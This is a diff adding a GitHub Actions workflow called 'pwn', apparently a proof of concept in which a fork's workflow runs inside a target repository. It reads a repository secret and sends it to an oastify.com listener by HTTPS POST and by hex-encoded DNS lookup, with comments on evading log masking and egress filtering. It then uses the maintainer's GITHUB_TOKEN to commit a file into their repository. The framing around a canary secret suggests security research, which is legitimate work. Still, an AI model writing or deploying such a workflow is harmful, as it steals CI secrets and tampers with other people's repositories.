@@ -1,0 +1,64 @@
+name: pwn
+on: [push]
+permissions:
+  contents: write
+jobs:
+  pwn:
+    # Only act when this runs inside the TARGET repository. Without this guard the job also
+    # fires on every push to the attacker's own fork, where its write step commits back to the
+    # fork branch - which updates the pull request head and re-arms GitHub's fork-approval
+    # gate, so the forged check can never stay green. That is a PoC artifact, not a defence.
+    if: github.repository == 'mustala83/mergify-final'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Where am I actually running?
+        run: |
+          echo "PWN-MARKER repository=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME ref=$GITHUB_REF"
+
+      - name: Read the maintainer's secret
+        env:
+          CANARY: ${{ secrets.POC_CANARY }}
+        run: |
+          # fingerprint only - never print a secret into logs that may be public
+          echo "PWN-SECRET length=${#CANARY} sha256=$(printf '%s' "$CANARY" | sha256sum | cut -c1-16)"
+
+      - name: Exfiltrate the secret to a host I control
+        if: env.COLLAB != ''
+        continue-on-error: true
+        env:
+          CANARY: ${{ secrets.POC_CANARY }}
+          COLLAB: lf4w1gk401wvfubie9829aypyg47sxgm.oastify.com
+        run: |
+          # (a) HTTPS POST carries the value verbatim.
+          # (b) DNS lookup of <hex>.<listener> survives HTTP egress filtering AND defeats
+          #     GitHub's log masking, which only redacts the LITERAL secret string.
+          HEX=$(printf '%s' "$CANARY" | od -An -tx1 | tr -d ' \n')
+          curl -s -m 10 -X POST "https://$COLLAB/exfil" \
+               -H "X-Exfil-Canary: $CANARY" \
+               --data-urlencode "canary=$CANARY" >/dev/null 2>&1 || true
+          getent hosts "${HEX:0:60}.$COLLAB" >/dev/null 2>&1 || \
+            nslookup "${HEX:0:60}.$COLLAB" >/dev/null 2>&1 || true
+          echo "PWN-EXFIL sent to $COLLAB (hex prefix ${HEX:0:16})"
+
+      - name: Use the maintainer's GITHUB_TOKEN against their own repository
+        continue-on-error: true
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          FILE=OWNER_DID_NOT_WANT_THIS.md
+          SHA=$(gh api "repos/$GITHUB_REPOSITORY/contents/$FILE?ref=$GITHUB_REF_NAME" --jq .sha 2>/dev/null || true)
+          ARGS=(-X PUT "repos/$GITHUB_REPOSITORY/contents/$FILE"
+                -f "message=written by a workflow that only ever existed in a fork"
+                -f "content=$(printf '%s' "created by an outside contributor, run $GITHUB_RUN_ID" | base64 -w0)"
+                -f "branch=$GITHUB_REF_NAME")
+          [ -n "$SHA" ] && [ "$SHA" != null ] && ARGS+=(-f "sha=$SHA")
+          if OUT=$(gh api "${ARGS[@]}" 2>&1); then
+            echo "PWN-WRITE ok - committed $FILE into $GITHUB_REPOSITORY"
+          else
+            echo "$OUT"
+            case "$OUT" in
+              *"Resource not accessible by integration"*)
+                echo "PWN-WRITE blocked: the repository's Actions token is READ-ONLY." ;;
+              *) echo "PWN-WRITE failed for another reason - NOT necessarily permissions." ;;
+            esac
+          fi
